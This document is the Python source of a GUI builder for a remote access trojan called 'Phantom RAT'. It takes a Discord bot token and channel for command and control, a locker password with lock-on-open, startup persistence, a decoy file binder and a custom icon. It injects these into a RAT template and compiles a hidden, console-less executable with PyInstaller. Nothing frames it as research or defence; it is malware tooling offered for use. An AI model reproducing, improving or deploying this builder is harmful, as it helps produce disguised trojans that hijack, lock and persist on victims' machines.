import customtkinter as ctk
import os, base64, subprocess, threading, sys, time, platform, random
from tkinter import messagebox, filedialog
from PIL import Image

# --- CONFIGURATION & STYLING ---
NEON_PURPLE = "#a020f0"
NEON_GREEN = "#39ff14"
DARK_BG = "#0a0a0a"
CONTAINER_BG = "#161616"

def file_to_base64(filepath):
    if not filepath or not os.path.exists(filepath): return ""
    try:
        with open(filepath, "rb") as f:
            return base64.b64encode(f.read()).decode('utf-8')
    except: return ""

class RATBuilder(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("PHANTOM RAT BUILDER v6.6")
        self.geometry("950x720") 
        self.configure(fg_color=DARK_BG)
        self.resizable(False, False)
        
        self.current_dir = os.path.dirname(os.path.abspath(__file__))
        self.template_path = os.path.join(self.current_dir, "rat-template.py")
        self.theme_dir = os.path.join(self.current_dir, "theme")
        
        self.binder_file_path = ""
        self.icon_file_path = ""

        if not os.path.exists(self.theme_dir): os.makedirs(self.theme_dir)

        # --- HEADER AREA ---
        self.header = ctk.CTkLabel(self, text="PHANTOM BUILDER", font=("Orbitron", 28, "bold"), text_color=NEON_PURPLE)
        self.header.pack(pady=(10, 0))
        self.sub_header = ctk.CTkLabel(self, text="ADVANCED REMOTE ACCESS TROJAN", font=("Consolas", 10), text_color=NEON_GREEN)
        self.sub_header.pack(pady=(0, 5))

        # --- MAIN SPLIT CONTAINER ---
        self.main_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.main_frame.pack(fill="both", expand=True, padx=20, pady=5)

        # --- LEFT COLUMN (Inputs) ---
        self.left_col = ctk.CTkFrame(self.main_frame, fg_color=CONTAINER_BG, border_color=NEON_PURPLE, border_width=1)
        self.left_col.pack(side="left", fill="both", expand=True, padx=(0, 10))

        self.create_label(self.left_col, "🌐 1. DISCORD GATEWAY")
        self.token_entry = self.create_entry(self.left_col, "Bot Token")
        self.channel_entry = self.create_entry(self.left_col, "Channel ID")

        self.create_label(self.left_col, "🛡️ 2. SECURITY & PERSISTENCE")
        self.pass_entry = self.create_entry(self.left_col, "Locker Password")

        self.lock_mode_var = ctk.StringVar(value="command")

        radio_frame = ctk.CTkFrame(self.left_col, fg_color="transparent")
        radio_frame.pack(pady=5, padx=20, fill="x")

        self.radio_on_exe = ctk.CTkRadioButton(radio_frame, text="Lock on Open", variable=self.lock_mode_var, value="instant", text_color="white", fg_color=NEON_PURPLE)
        self.radio_on_exe.pack(side="left", padx=5)

        self.radio_on_cmd = ctk.CTkRadioButton(radio_frame, text="Lock on Command", variable=self.lock_mode_var, value="command", text_color="white", fg_color=NEON_PURPLE)
        self.radio_on_cmd.pack(side="left", padx=5)
        
        check_frame = ctk.CTkFrame(self.left_col, fg_color="transparent")
        check_frame.pack(pady=5, padx=20, fill="x")
        self.persist_mode = ctk.CTkCheckBox(check_frame, text="Auto-Startup", text_color="white", fg_color=NEON_PURPLE)
        self.persist_mode.pack(side="left", padx=5)
        self.offline_notif = ctk.CTkCheckBox(check_frame, text="Offline Notif", text_color="white", fg_color=NEON_PURPLE)
        self.offline_notif.pack(side="left", padx=5)

        # --- FILE BINDER & ICON SECTION ---
        self.create_label(self.left_col, "🖇️ 3. FILE BINDER & ICON")
        
        self.btn_binder = ctk.CTkButton(self.left_col, text="📁 Select File to Bind", fg_color=DARK_BG, border_color=NEON_PURPLE, border_width=1, command=self.select_binder_file)
        self.btn_binder.pack(pady=5, padx=20, fill="x")
        self.binder_label = ctk.CTkLabel(self.left_col, text="No file bound", font=("Consolas", 10), text_color="#777")
        self.binder_label.pack(padx=20)

        self.btn_icon = ctk.CTkButton(self.left_col, text="🎨 Select Icon (IMG/ICO)", fg_color=DARK_BG, border_color=NEON_PURPLE, border_width=1, command=self.select_icon_file)
        self.btn_icon.pack(pady=5, padx=20, fill="x")
        self.icon_label = ctk.CTkLabel(self.left_col, text="Default Icon", font=("Consolas", 10), text_color="#777")
        self.icon_label.pack(padx=20)

        # --- RIGHT COLUMN (Preview & Logs) ---
        self.right_col = ctk.CTkFrame(self.main_frame, fg_color=CONTAINER_BG, border_color=NEON_PURPLE, border_width=1)
        self.right_col.pack(side="right", fill="both", expand=True, padx=(10, 0))

        self.create_label(self.right_col, "🖼️ 4. THEME PREVIEW")
        theme_files = self.get_theme_list()
        self.theme_var = ctk.StringVar(value=theme_files[0] if theme_files else "No Image")
        self.theme_menu = ctk.CTkOptionMenu(self.right_col, values=theme_files, variable=self.theme_var, command=self.update_preview)
        self.theme_menu.pack(pady=5, padx=20, fill="x")

        self.preview_label = ctk.CTkLabel(self.right_col, text="PREVIEW AREA", width=300, height=150, fg_color="#000", corner_radius=8)
        self.preview_label.pack(pady=10, padx=20)
        self.update_preview(self.theme_var.get())

        self.log_box = ctk.CTkTextbox(self.right_col, height=120, fg_color=DARK_BG, text_color=NEON_GREEN, font=("Consolas", 11))
        self.log_box.pack(pady=(5, 10), padx=20, fill="both", expand=True)

        self.stats_frame = ctk.CTkFrame(self.right_col, fg_color="#0d0d0d", height=40)
        self.stats_frame.pack(fill="x", padx=20, pady=(0, 10))
        self.entropy_lbl = ctk.CTkLabel(self.stats_frame, text="ENTROPY: 0.00", font=("Consolas", 10), text_color="#777")
        self.entropy_lbl.pack(side="left", padx=10)
        self.fud_status = ctk.CTkLabel(self.stats_frame, text="STUB: CLEAN", font=("Consolas", 10), text_color=NEON_GREEN)
        self.fud_status.pack(side="right", padx=10)

        # --- BUILD BUTTON ---
        self.build_btn = ctk.CTkButton(self, text="🚀 INITIALIZE GENERATION", fg_color=NEON_GREEN, text_color="black", font=("Orbitron", 18, "bold"), height=55, command=self.start_build_thread)
        self.build_btn.pack(pady=(10, 10), padx=20, fill="x")

        self.footer = ctk.CTkLabel(self, text=f"SYSTEM: {platform.system()} | USER: {os.getlogin()} | STATUS: READY", font=("Consolas", 9), text_color="#555")
        self.footer.pack(pady=(0, 5))

        threading.Thread(target=self.animate_ui, daemon=True).start()

    # --- ANIMATION ---
    def animate_ui(self):
        colors = [NEON_PURPLE, "#ffffff", NEON_PURPLE, NEON_GREEN]
        while True:
            for color in colors:
                self.header.configure(text_color=color)
                val = random.uniform(4.1, 7.8)
                self.entropy_lbl.configure(text=f"ENTROPY: {val:.2f}")
                time.sleep(0.8)

    # --- UPDATED SELECTORS WITH CANCEL LOGIC ---
    def select_binder_file(self):
        path = filedialog.askopenfilename(title="Select File to Bind")
        if path:
            self.binder_file_path = path
            self.binder_label.configure(text=f"Bound: {os.path.basename(path)}", text_color=NEON_GREEN)
        else:
            self.binder_file_path = ""
            self.binder_label.configure(text="Binder Selection Cancelled", text_color="red")

    def select_icon_file(self):
        path = filedialog.askopenfilename(title="Select Icon", filetypes=[("Image Files", "*.ico *.png *.jpg *.jpeg")])
        if path:
            self.icon_file_path = path
            self.icon_label.configure(text=f"Selected: {os.path.basename(path)}", text_color=NEON_GREEN)
        else:
            self.icon_file_path = ""
            self.icon_label.configure(text="Icon Selection Cancelled", text_color="red")

    def get_theme_list(self):
        if not os.path.exists(self.theme_dir): return []
        return [f for f in os.listdir(self.theme_dir) if f.lower().endswith(('.png', '.jpg'))] or ["No Image"]

    def update_preview(self, choice):
        path = os.path.join(self.theme_dir, choice)
        if os.path.exists(path):
            try:
                img = Image.open(path)
                ctk_img = ctk.CTkImage(img, size=(300, 150))
                self.preview_label.configure(image=ctk_img, text="")
            except: pass

    def create_label(self, parent, text):
        ctk.CTkLabel(parent, text=text, font=("Consolas", 12, "bold"), text_color=NEON_PURPLE).pack(pady=(12, 2), padx=20, anchor="w")

    def create_entry(self, parent, placeholder):
        ent = ctk.CTkEntry(parent, placeholder_text=placeholder, width=350, fg_color=DARK_BG, border_color=NEON_PURPLE)
        ent.pack(pady=2, padx=20)
        return ent

    def log(self, message):
        self.log_box.insert("end", f" [>] {message}\n")
        self.log_box.see("end")

    def start_build_thread(self):
        self.log_box.delete("1.0", "end")
        threading.Thread(target=self.execute_generation, daemon=True).start()

    def execute_generation(self):
        self.build_btn.configure(state="disabled", text="🔨 COMPILING...")
        temp_icon_created = False
        final_icon_path = ""
        
        try:
            self.log("Initializing Phantom Engine...")
            token = self.token_entry.get()
            channel = self.channel_entry.get()
            if not token or not channel: raise Exception("Gateway Credentials Missing")

            # --- PROTEKSI ICON (Gunakan Path Absolut) ---
            if self.icon_file_path:
                try:
                    self.log("Refining icon path...")
                    # Simpan temp_icon di folder yang sama dengan script agar terbaca compiler
                    final_icon_path = os.path.abspath(os.path.join(self.current_dir, "build_icon.ico"))
                    img = Image.open(self.icon_file_path)
                    icon_sizes = [(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)]
                    img.save(final_icon_path, format='ICO', sizes=icon_sizes)
                    temp_icon_created = True
                except Exception as e:
                    self.log(f"Icon process failed: {e}")
                    final_icon_path = ""

            # --- PROSES TEMPLATE (Sama seperti kemarin) ---
            with open(self.template_path, "r", encoding="utf-8") as f: 
                code = f.read()

            b64_img = file_to_base64(os.path.join(self.theme_dir, self.theme_var.get()))
            b64_binder = file_to_base64(self.binder_file_path) if self.binder_file_path else ""
            binder_name = os.path.basename(self.binder_file_path) if self.binder_file_path else "NONE"

            is_lock_instant = "True" if self.lock_mode_var.get() == "instant" else "False"
            code = code.replace('TOKEN = "YOUR_BOT_TOKEN"', f'TOKEN = "{token}"')
            code = code.replace('MY_CHANNEL_ID = YOUR_CHANNEL_ID_INT', f'MY_CHANNEL_ID = {channel}')
            code = code.replace('GAMBAR_BASE64 = "BG_IMAGE_DATA"', f'GAMBAR_BASE64 = "{b64_img}"')
            code = code.replace('DECOY_DATA = "DECOY_BASE64_DATA"', f'DECOY_DATA = "{b64_binder}"')
            code = code.replace('DECOY_NAME = "original_installer.exe"', f'DECOY_NAME = "{binder_name}"')
            code = code.replace('PASSWORD_BENAR = "YOUR_PASSWORD"', f'PASSWORD_BENAR = "{self.pass_entry.get()}"')
            code = code.replace('LOCK_ON_START = False', f'LOCK_ON_START = {is_lock_instant}')
            code = code.replace('PERSISTENCE_ENABLED = False', f'PERSISTENCE_ENABLED = {"True" if self.persist_mode.get() else "False"}')

            dist_folder = os.path.abspath(os.path.join(self.current_dir, "dist"))
            py_final = os.path.join(dist_folder, "stub_ready.py")
            if not os.path.exists(dist_folder): os.makedirs(dist_folder)
            with open(py_final, "w", encoding="utf-8") as f: f.write(code)

            self.log("Launching Compiler Engine...")

            # --- KEMBALI KE FORMAT STRING (Yang kemarin bisa) ---
            # Kita pakai format string tunggal lagi, tapi icon dipaksa absolut
            base_cmd = f'"{sys.executable}" -m PyInstaller --noconsole --onefile --clean --noconfirm --distpath "{dist_folder}" --name "PhantomRAT"'
            
            if final_icon_path and os.path.exists(final_icon_path):
                base_cmd += f' --icon="{final_icon_path}"'
            
            full_cmd = f'{base_cmd} "{py_final}"'
            
            # Jalankan dengan shell=True seperti yang sebelumnya jalan
            process = subprocess.run(full_cmd, shell=True, capture_output=True, creationflags=0x08000000)
            
            if process.returncode == 0:
                self.log("BUILD SUCCESSFUL!")
                messagebox.showinfo("Success", "Payload generated successfully!")
            else:
                err = process.stderr.decode('utf-8', errors='ignore')
                self.log(f"BUILD FAILED: {err[:50]}...")
                print(f"FULL ERROR:\n{err}")

        except Exception as e:
            self.log(f"CRITICAL ERROR: {str(e)}")
            messagebox.showerror("Build Error", str(e))
        
            
        self.build_btn.configure(state="normal", text="🚀 INITIALIZE GENERATION")

if __name__ == "__main__":
    app = RATBuilder()
    app.mainloop()
